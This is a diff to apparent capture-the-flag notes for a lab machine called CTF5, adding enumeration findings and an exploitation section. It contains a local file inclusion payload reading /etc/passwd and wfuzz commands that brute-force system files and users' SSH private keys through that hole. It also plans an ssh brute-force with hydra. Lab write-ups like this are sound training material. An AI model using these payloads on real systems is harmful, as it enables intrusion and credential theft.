@@ -22,13 +22,13 @@ Security: CTF5
 * [ ] ssh
 * [ ] smtp
 * [ ] 80 httpd
-* ??? pop3
+  ??? pop3
 * [ ] rpcbind
 * [ ] netbios
-* ??? imap
-* ??? 901
-* [x] mysql
-* ??? 40050
+  ??? imap
+  ??? 901
+* [ ] mysql
+  ??? 40050
 
 ### smtp
 
@@ -74,6 +74,10 @@ Nothing.
 
 * phpMyAdmin 3.1.4
 
+#### /events/robots.txt
+
+A lot of urls.
+
 ### pop3
 
 With `pop3-capabilities` nmap script:
@@ -99,3 +103,29 @@ My attemts with `smbclient --no-pass //192.168.88.220/` or `smbclient -N -L //19
 3. Attempt to inject SQL code.
 
 4. brute-force ssh with hydra based on the found users.
+
+## Vulnerabilities analysis
+
+1. Didn't find usefull cve...
+
+2. Found LFI at `/index.php?page=../../../../../../etc/passwd%00`.
+
+3. `/list` has response with error on `' test`.
+
+4. Nothing.
+
+## Exploitation
+
+### LFI
+
+I wanted to use wfuzz and brute-force all useful files:
+```bash
+wfuzz -c -w /usr/share/wordlists/lfi_linux.txt --hs "Warning" http://192.168.88.220/index.php?page=../../../../../../FUZZ%00 > wfuzz.txt
+```
+
+Brute-force `.ssh` and `id_rsa` key, but nothing:
+```
+wfuzz -c -w ../enum/creds/users.txt --hs "Warning" http://192.168.88.220/index.php?page=../../../../../../home/FUZZ/.ssh/id_rsa%00 > ssh_keys.txt 
+```
+
+
